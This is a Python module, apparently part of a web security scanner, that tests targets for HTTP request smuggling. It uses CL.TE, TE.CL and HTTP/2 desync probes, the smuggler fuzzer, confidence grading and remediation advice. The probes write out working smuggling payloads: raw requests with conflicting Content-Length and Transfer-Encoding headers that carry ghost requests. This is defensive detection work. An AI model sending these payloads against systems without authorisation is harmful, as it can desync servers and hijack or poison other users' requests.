"""Stage 5: HTTP request smuggling, graded as what it actually is.

Pipeline: ambiguity pre-filter first (a server that 400-rejects dual
Content-Length/Transfer-Encoding headers cannot be desynced this way,
so smuggler never runs there), then manual CL.TE, TE.CL and H2.CL/H2.TE desync oracles on one
socket (a smuggled prefix surfacing in the next response is proof),
then smuggler's fuzzer output recorded honestly as TENTATIVE candidates
for the ambiguous-but-unproven remainder.

Smuggling is a disagreement between a front-end proxy and a back-end
server about where one request ends and the next begins. Anything this
module emits without a desync stays TENTATIVE until a person has seen
it — the impact if real is severe, but the tool has not shown a desync
that survives scrutiny.
"""

import http.client
import re
import secrets
import socket
import ssl
from urllib.parse import urlparse

from modules.base import BaseModule
from tools.external import smuggler_scan, tool_available


def h2_verdict(responses: dict, marker: str) -> tuple:
    """The ghost must answer the *next* stream; stream 1 may echo it."""
    victim = responses.get(3) or {}
    body = victim.get("body", "") or ""
    if marker and marker in body:
        return True, (f"stream 3 answered the ghost path "
                      f"(HTTP {victim.get('status', 0)})")
    return False, (f"no marker on stream 3 "
                   f"(HTTP {victim.get('status', 0)}, {len(body)} bytes)")


class HTTPSmuggling(BaseModule):
    id = "http_smuggling"
    name = "HTTP Smuggling Scan"
    stage = 5
    detectability = "high"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        cfg = self._cfg()
        if cfg.get("enabled", True) is False:
            self.state.skip_module(self.id, "disabled in config")
            return "skipped"

        targets = self._targets()
        if not targets:
            targets = [self.base_url]

        if not tool_available("smuggler"):
            self.state.skip_module(self.id, "smuggler not installed")
            return "skipped"

        limit = int(cfg.get("max_targets", 0) or 0)
        confirmed = 0
        reported = 0
        for target in (targets if limit <= 0 else targets[:limit]):
            ambiguous, ambiguity_note = await self._ambiguous(target)
            if not ambiguous:
                self.log(f"  {target}: strict header handling "
                         f"({ambiguity_note}) — smuggler would be noise here")
                if cfg.get("h2", True) and await self._h2_desync(target):
                    confirmed += 1
                continue
            if await self._desync_oracle(target, "cl_te"):
                confirmed += 1
                continue
            if cfg.get("te_cl", True) and await self._desync_oracle(
                    target, "te_cl"):
                confirmed += 1
                continue
            if cfg.get("h2", True) and await self._h2_desync(target):
                confirmed += 1
                continue
            result = await smuggler_scan(target, timeout=300)
            hits = result.get("results", [])
            evidence_id = self.state.add_evidence(
                self.id, "smuggler", target,
                {"results": hits, "stdout": result.get("stdout", ""),
                 "exit_code": result.get("exit_code"),
                 "stderr": result.get("stderr", "")},
            )
            if hits:
                reported += len(hits)
                self.state.add_finding(
                    title=f"HTTP smuggling candidate: {target}",
                    # Unconfirmed. The impact if real is severe, but the tool
                    # has not shown a desync that survives scrutiny.
                    severity="MEDIUM",
                    confidence="TENTATIVE",
                    category="HTTP Request Smuggling",
                    description=(
                        f"smuggler returned {len(hits)} candidate line(s) for "
                        f"{target}. This is a fuzzer's output, not a confirmed "
                        "desync: a request-smuggling bug needs a front-end and "
                        "a back-end server that disagree on request boundaries, "
                        "and that has not been shown here. Reproduce it with a "
                        "controlled two-request sequence before treating it as "
                        "a finding — the impact if genuine is high, so it is "
                        "worth the hour."
                    ),
                    evidence=[str(hit) for hit in hits[:15]],
                    evidence_refs=[evidence_id],
                    remediation=(
                        "Normalise HTTP parsing between front end and back end: "
                        "reject ambiguous Content-Length/Transfer-Encoding "
                        "combinations, and use a single parser with identical "
                        "rules on both hops."
                    ),
                    verified=False,
                )

        self.state.complete_module(self.id)
        self.log(f"HTTP smuggling: {confirmed} desync-confirmed, "
                 f"{reported} unconfirmed candidates")
        return "done"

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}

    def _connection(self, url: str, timeout: int = 15, alpn=None):
        """One raw connection, plain or TLS. http.client sends both
        Content-Length and Transfer-Encoding as written — no
        normalization — which is exactly what the oracle needs."""
        parsed = urlparse(url)
        use_tls = (parsed.scheme or "http").lower() == "https"
        host = parsed.hostname or ""
        port = parsed.port or (443 if use_tls else 80)
        if use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            if alpn:
                context.set_alpn_protocols(list(alpn))
            raw = socket.create_connection((host, port), timeout=timeout)
            sock = context.wrap_socket(raw, server_hostname=host)
            if alpn and sock.selected_alpn_protocol() not in alpn:
                sock.close()
                raise OSError("ALPN did not negotiate " + ",".join(alpn))
        else:
            sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        return sock, host

    @staticmethod
    def _read_response(sock, timeout: int = 10) -> tuple:
        """Read one full HTTP response (head + declared body) off a socket.

        Consuming the body matters: leftover bytes would parse as a phantom
        extra response on the next read, and phantom responses are exactly
        what this oracle counts.
        """
        sock.settimeout(timeout)
        data = b""
        try:
            while b"\r\n\r\n" not in data and b"\n\n" not in data:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
        except (socket.timeout, OSError):
            pass
        text = data.decode("utf-8", errors="replace")
        match = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", text)
        status = int(match.group(1)) if match else 0
        length_match = re.search(r"content-length:\s*(\d+)", text, re.I)
        if length_match and status:
            want = int(length_match.group(1))
            sep = re.search(r"\r\n\r\n|\n\n", text)
            have = len(data) - (sep.end() if sep else len(data))
            try:
                while have < want:
                    chunk = sock.recv(min(4096, want - have))
                    if not chunk:
                        break
                    data += chunk
                    have += len(chunk)
            except (socket.timeout, OSError):
                pass
            text = data.decode("utf-8", errors="replace")
        return status, text

    async def _ambiguous(self, target: str) -> tuple:
        """Does the server accept dual Content-Length + Transfer-Encoding?

        A 400/501 rejection means strict parsing: smuggling through header
        ambiguity is off the table and running the fuzzer only produces
        noise. Returns (ambiguous, note). Runs in a thread: raw sockets
        block.
        """
        import asyncio as _asyncio

        def probe() -> tuple:
            try:
                sock, host = self._connection(target, timeout=12)
            except OSError as exc:
                return False, f"connect failed: {exc}"
            try:
                body = (f"POST {urlparse(target).path or '/'} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: 7\r\n"
                        "Transfer-Encoding: chunked\r\n"
                        "Connection: close\r\n\r\n"
                        "0\r\n\r\n")
                sock.sendall(body.encode())
                status, _ = self._read_response(sock, timeout=10)
            except OSError as exc:
                return False, f"probe failed: {exc}"
            finally:
                try:
                    sock.close()
                except OSError:
                    pass
            if status in (400, 501, 505):
                return False, f"strict rejection (HTTP {status})"
            if status == 0:
                return False, "no response"
            return True, f"accepted dual headers (HTTP {status})"

        return await _asyncio.to_thread(probe)

    @staticmethod
    def _smuggle_prefix(mode: str, host: str, path: str,
                        marker: str) -> str:
        if mode == "te_cl":
            # Front end frames by chunked (sees the zero chunk and treats
            # the tail as the next request); back end frames by the 6-byte
            # Content-Length, eating `0\r\n\r\nG` and leaving a complete
            # `POST /<marker>` request for the socket.
            return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 6\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "Connection: keep-alive\r\n\r\n"
                    "0\r\n\r\n"
                    f"GPOST /{marker} HTTP/1.1\r\nHost: {host}\r\n"
                    "Content-Length: 5\r\n\r\n"
                    "x=1\r\n\r\n")
        return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Connection: keep-alive\r\n\r\n"
                "5c\r\n"
                f"GPOST /{marker} HTTP/1.1\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 15\r\n\r\n"
                "x=1\r\n"
                "0\r\n\r\n")

    async def _desync_oracle(self, target: str, mode: str = "cl_te") -> bool:
        """Desync proof on one socket, for one framing disagreement.

        CL.TE: a front end that frames by Content-Length forwards a
        fragment the back end re-parses as a request start. TE.CL: a front
        end that frames by chunked lets a chunk tail through that the back
        end (keeping Content-Length) reads as a request. Either way a
        `GET|POST /<random-404>` ghost surfaces where the real second
        response should be — a desync, not a guess.
        """
        import asyncio as _asyncio

        marker = f"hopefully404-{secrets.token_hex(4)}"

        def probe() -> tuple:
            try:
                sock, host = self._connection(target, timeout=20)
            except OSError as exc:
                return False, f"connect failed: {exc}"
            try:
                path = urlparse(target).path or "/"
                prefix = self._smuggle_prefix(mode, host, path, marker)
                normal = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                          "Connection: close\r\n\r\n")
                sock.sendall(prefix.encode() + normal.encode())
                first = self._read_response(sock, timeout=12)
                second = self._read_response(sock, timeout=12)
                third = self._read_response(sock, timeout=6)
            except OSError as exc:
                return False, f"socket failed: {exc}"
            finally:
                try:
                    sock.close()
                except OSError:
                    pass
            responses = [first, second, third]
            texts = " ".join(text for _, text in responses)
            if marker in texts:
                return True, "smuggled prefix answered as its own request"
            answered = [(status, text[:120]) for status, text in responses
                        if status]
            if len(answered) >= 3:
                return True, f"{len(answered)} responses for 2 requests"
            return False, f"responses: {[status for status, _ in answered]}"

        try:
            proven, note = await _asyncio.wait_for(
                _asyncio.to_thread(probe), timeout=60)
        except Exception as exc:
            self.log(f"  desync oracle failed for {target}: {exc}")
            return False
        label = "TE.CL" if mode == "te_cl" else "CL.TE"
        evidence_id = self.state.add_evidence(
            self.id, f"{mode}_desync_oracle", target,
            {"marker": marker, "result": note, "proven": proven},
        )
        if proven:
            self.state.add_finding(
                title=f"HTTP Request Desync Confirmed ({label}): {target}",
                severity="HIGH",
                confidence="CONFIRMED",
                category="HTTP Request Smuggling",
                description=(
                    f"A {label} desync oracle against {target} surfaced a "
                    f"ghost response ({note}). The front end and back end "
                    f"disagree on request boundaries: requests can be "
                    f"smuggled past the front end."
                ),
                evidence=[f"Target: {target}", f"Marker: {marker}",
                          f"Oracle: {note}"],
                evidence_refs=[evidence_id],
                remediation=(
                    "Normalise HTTP parsing between front end and back end: "
                    "reject ambiguous Content-Length/Transfer-Encoding "
                    "combinations, and use a single parser with identical "
                    "rules on both hops."
                ),
                verified=True,
                verification={"method": f"{mode}_desync_oracle",
                                  "url": target,
                                  "marker": marker},
            )
            self.log(f"  {label} DESYNC CONFIRMED on {target} ({note})")
        return proven

    def _h2_prefix(self, mode: str, host: str, marker: str) -> str:
        ghost = f"GET /{marker} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        if mode == "h2_te":
            return (f"{len(ghost):x}\r\n{ghost}\r\n0\r\n\r\n")
        return ghost

    async def _h2_desync(self, target: str) -> bool:
        """H2.CL / H2.TE: does the smuggled prefix answer the next stream?

        The proof is stream-bound: the ghost path appears in stream 3's
        response, which is the request we sent *after* the ambiguous one.
        An echo on stream 1 (the attacker's own POST) is not counted — a
        server is allowed to reflect a body it received without ever
        desyncing. No ALPN h2 means this probe simply does not apply.
        """
        import asyncio as _asyncio

        for mode in ("h2_cl", "h2_te"):
            try:
                proven, note = await _asyncio.wait_for(
                    _asyncio.to_thread(self._h2_probe, target, mode),
                    timeout=45)
            except Exception as exc:
                self.log(f"  {mode} probe failed for {target}: {exc}")
                return False
            if proven:
                self.state.add_finding(
                    title=f"HTTP/2 Request Desync Confirmed: {target}",
                    severity="HIGH",
                    confidence="CONFIRMED",
                    category="HTTP Request Smuggling",
                    description=(
                        f"An HTTP/2 {mode.upper()} probe against {target} "
                        "made the response to the next stream carry the "
                        f"smuggled path ({note}). The H2 front end and the "
                        "HTTP/1.1 back end disagree on request boundaries, "
                        "so a request can be smuggled past the edge."
                    ),
                    evidence=[f"Target: {target}", f"Mode: {mode}",
                              f"Oracle: {note}"],
                    remediation=(
                        "Reject H2 requests whose content-length does not "
                        "match the DATA frames and strip Transfer-Encoding "
                        "on the H2-to-HTTP/1.1 hop; normalise framing in one "
                        "parser."
                    ),
                    verified=True,
                    verification={"method": f"{mode}_desync_oracle",
                                  "url": target},
                )
                self.log(f"  {mode.upper()} DESYNC CONFIRMED on {target}")
                return True
            if note.startswith("no h2"):
                self.log(f"  {target}: {note}")
                return False
        return False

    def _h2_probe(self, target: str, mode: str) -> tuple:
        import h2.config
        import h2.connection
        import h2.events
        import time

        marker = f"h2ghost-{secrets.token_hex(4)}"
        parsed = urlparse(target)
        scheme = (parsed.scheme or "http").lower()
        path = parsed.path or "/"
        try:
            sock, host = self._connection(target, timeout=15, alpn=["h2"])
        except OSError as exc:
            return False, f"no h2: {exc}"
        config = h2.config.H2Configuration(
            client_side=True, header_encoding="utf-8",
            validate_outbound_headers=False,
            normalize_outbound_headers=False)
        conn = h2.connection.H2Connection(config=config)
        responses = {1: {"status": 0, "body": ""},
                     3: {"status": 0, "body": ""}}
        ended = set()
        try:
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            headers = [
                (":method", "POST"), (":path", path),
                (":scheme", scheme), (":authority", host),
            ]
            if mode == "h2_te":
                headers.append(("transfer-encoding", "chunked"))
            else:
                headers.append(("content-length", "0"))
            conn.send_headers(1, headers, end_stream=False)
            conn.send_data(1, self._h2_prefix(mode, host, marker).encode(),
                           end_stream=True)
            conn.send_headers(3, [
                (":method", "GET"), (":path", "/"),
                (":scheme", scheme), (":authority", host),
            ], end_stream=True)
            sock.sendall(conn.data_to_send())

            deadline = time.time() + 10
            while time.time() < deadline and len(ended) < 2:
                sock.settimeout(max(0.5, deadline - time.time()))
                try:
                    data = sock.recv(65535)
                except (socket.timeout, OSError):
                    break
                if not data:
                    break
                for event in conn.receive_data(data):
                    if isinstance(event, h2.events.ResponseReceived):
                        status = dict(event.headers).get(":status")
                        if event.stream_id in responses:
                            responses[event.stream_id]["status"] = int(
                                status or 0)
                    elif isinstance(event, h2.events.DataReceived):
                        if event.stream_id in responses:
                            responses[event.stream_id]["body"] += \
                                event.data.decode("utf-8", errors="replace")
                        conn.acknowledge_received_data(
                            event.flow_controlled_length, event.stream_id)
                    elif isinstance(event, (h2.events.StreamEnded,
                                            h2.events.StreamReset)):
                        ended.add(event.stream_id)
                pending = conn.data_to_send()
                if pending:
                    sock.sendall(pending)
        finally:
            try:
                sock.close()
            except OSError:
                pass

        return h2_verdict(responses, marker)

    def _targets(self) -> list[str]:
        targets = []
        for asset_type in ("webapp", "url"):
            for asset in self.state.get_assets_by_type(asset_type):
                value = str(asset.get("value", "")).strip()
                if value.startswith(("http://", "https://")) and value not in targets:
                    targets.append(value)
        return targets
